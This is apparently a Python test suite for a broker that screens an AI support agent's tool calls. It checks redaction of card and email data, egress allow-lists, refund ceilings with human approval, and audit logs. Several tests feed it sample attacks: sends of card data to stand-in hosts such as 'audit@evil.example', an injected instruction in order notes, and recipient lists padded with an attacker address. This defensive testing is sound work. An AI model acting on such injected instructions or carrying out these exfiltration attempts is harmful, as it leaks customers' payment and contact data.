"""End to end through the decision point: what the agent gets, and what the
transport gets. The gap between those two is what these tests measure."""

from __future__ import annotations

from decimal import Decimal

import pytest

from broker.models import Provenance, ReasonCode, Request


def _req(**kwargs) -> Request:
    base = dict(
        subject="support_agent",
        purpose="customer_remediation",
        tool="read_record",
        resource="order/4471",
        provenance=Provenance.USER,
        session_id="s1",
    )
    base.update(kwargs)
    return Request(**base)


def test_read_returns_handles_for_sensitive_fields(broker):
    result = broker.handle(_req())
    assert result.decision == "redact"
    assert result.output["card_number"].startswith("hdl_")
    assert result.output["email"].startswith("hdl_")
    assert result.output["status"] == "refund_pending"


def test_the_agent_never_receives_a_raw_sensitive_value(broker, records):
    result = broker.handle(_req())
    serialized = str(result.model_dump())
    assert records.get("4471")["card_number"] not in serialized
    assert records.get("4471")["email"] not in serialized


def test_unmatched_request_is_denied_with_a_coarse_reason(broker):
    result = broker.handle(_req(subject="stranger"))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.NO_GRANT


def test_denied_send_does_not_reach_the_transport(broker, transport):
    """Stronger than asserting the broker said no: nothing hit the wire."""
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": "attacker@evil.example", "body": "hello"},
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.DESTINATION_NOT_ALLOWED
    assert transport.sent == []


def test_egress_to_an_allowed_recipient_succeeds(broker, transport):
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": "dana.whitfield@acme-customers.example", "body": "Refunded."},
        )
    )
    assert result.allowed
    assert transport.sent[0]["to"] == "dana.whitfield@acme-customers.example"


def test_a_send_receipt_does_not_leak_the_resolved_address(broker, transport, records):
    """The confirmation must not undo the redaction one turn later.

    The transport necessarily knows the real address. If the broker hands the
    transport's receipt straight back, that address re-enters the agent's
    context and everything the redaction bought is lost.
    """
    read = broker.handle(_req())
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": read.output["email"], "body": "Refunded."},
        )
    )
    assert result.allowed
    assert records.get("4471")["email"] not in str(result.model_dump())
    assert transport.sent[0]["to"] == records.get("4471")["email"]


def test_a_recipient_handle_resolves_only_at_the_boundary(broker, transport):
    read = broker.handle(_req())
    email_handle = read.output["email"]
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": email_handle, "body": "Your refund is on its way."},
        )
    )
    assert result.allowed
    # The value existed only for the outbound call.
    assert transport.sent[0]["to"] == "dana.whitfield@acme-customers.example"


def test_a_card_handle_is_not_releasable_to_any_destination(broker, transport):
    """The exfiltration attempt in the worked scenario, at the egress layer."""
    read = broker.handle(_req())
    card_handle = read.output["card_number"]
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={
                "to": "support-archive@acme.example",
                "body": f"card {card_handle}",
            },
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.HANDLE_NOT_RESOLVABLE
    assert transport.sent == []


def test_injected_instruction_from_a_document_cannot_send(broker, transport):
    """The headline claim, at the provenance layer.

    Order notes on record 4472 contain an instruction to forward the card
    number. A request derived from that content is refused before policy is
    even consulted, and nothing reaches the transport.
    """
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            provenance=Provenance.UNTRUSTED_CONTENT,
            arguments={"to": "audit@evil.example", "body": "card 4222222222222"},
        )
    )
    assert result.decision == "deny"
    assert result.reason is ReasonCode.UNTRUSTED_ORIGIN
    assert transport.sent == []


def test_refund_within_limits_is_executed(broker, transport):
    result = broker.handle(
        _req(tool="issue_refund", arguments={"amount": "20.00", "currency": "USD"})
    )
    assert result.allowed
    assert transport.refunds[0]["amount"] == "20.00"


def test_refund_above_the_threshold_pauses_for_a_human(broker, transport):
    result = broker.handle(
        _req(tool="issue_refund", arguments={"amount": "30.00", "currency": "USD"})
    )
    assert result.decision == "needs_approval"
    assert transport.refunds == []  # nothing moves until a human decides


def test_small_refunds_cannot_add_up_past_the_session_ceiling(broker, transport):
    for _ in range(5):
        broker.handle(
            _req(tool="issue_refund", arguments={"amount": "24.00", "currency": "USD"})
        )
    total = sum(Decimal(entry["amount"]) for entry in transport.refunds)
    assert total <= Decimal("100.00")
    assert len(transport.refunds) == 4  # the fifth breaches the ceiling


def test_unknown_tool_is_refused(broker):
    result = broker.handle(_req(tool="delete_everything"))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.UNKNOWN_TOOL


def test_denials_are_counted_per_session_as_a_probing_signal(broker):
    for _ in range(3):
        broker.handle(_req(subject="stranger"))
    assert broker.session_denials("s1") == 3


@pytest.mark.parametrize(
    "to",
    [
        "attacker@evil.example,dana.whitfield@acme-customers.example",
        "attacker@evil.example, dana.whitfield@acme-customers.example",
        "attacker@evil.example;dana.whitfield@acme-customers.example",
    ],
)
def test_a_joined_recipient_list_never_reaches_the_transport(broker, transport, to):
    """An approved domain at the tail of a list approves nothing.

    The policy counts the recipients and refuses first; the egress layer
    refuses the same string on its own (tests/test_egress.py). Either way the
    customer's email handle in the body must not resolve for it.
    """
    read = broker.handle(_req())
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": to, "body": f"contact {read.output['email']}"},
        )
    )
    assert result.decision == "deny"
    assert result.reason in (ReasonCode.CONSTRAINT_EXCEEDED, ReasonCode.DESTINATION_NOT_ALLOWED)
    assert transport.sent == []


def test_the_display_name_form_is_delivered_to_the_bare_address(broker, transport):
    result = broker.handle(
        _req(
            tool="send_message",
            purpose="customer_notification",
            arguments={"to": "Dana Whitfield <dana.whitfield@acme-customers.example>", "body": "Refunded."},
        )
    )
    assert result.allowed
    assert transport.sent[0]["to"] == "dana.whitfield@acme-customers.example"


@pytest.mark.parametrize(
    "arguments",
    [{"currency": "USD"}, {"amount": None, "currency": "USD"}, {"amount": "NaN", "currency": "USD"}],
)
def test_a_refund_with_no_usable_amount_is_denied_and_logged(broker, transport, audit, arguments):
    """A decision the broker exists to make is made by the broker, and recorded."""
    result = broker.handle(_req(tool="issue_refund", arguments=arguments))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.INVALID_ARGUMENTS
    assert transport.refunds == []
    records = audit.read_all()
    assert len(records) == 1
    assert records[0].decision == "deny"
    assert records[0].reason == ReasonCode.INVALID_ARGUMENTS.value


def test_a_refund_grant_with_no_amount_constraint_is_still_refused_without_an_amount(
    egress, records, vault, audit, transport
):
    """The broker's own guard, for a grant the policy would wave through."""
    from broker.broker import Broker
    from broker.models import Grant
    from broker.policy import Policy

    open_grant = Policy(
        [Grant(id="open", subject="support_agent", purpose="customer_remediation",
               resource="order/*", action="issue_refund")]
    )
    broker = Broker(open_grant, egress, records, vault, audit, transport)
    assert open_grant.evaluate(_req(tool="issue_refund", arguments={"currency": "USD"})).allowed
    result = broker.handle(_req(tool="issue_refund", arguments={"currency": "USD"}))
    assert result.decision == "deny"
    assert result.reason is ReasonCode.INVALID_ARGUMENTS
    assert transport.refunds == []
    assert len(audit.read_all()) == 1
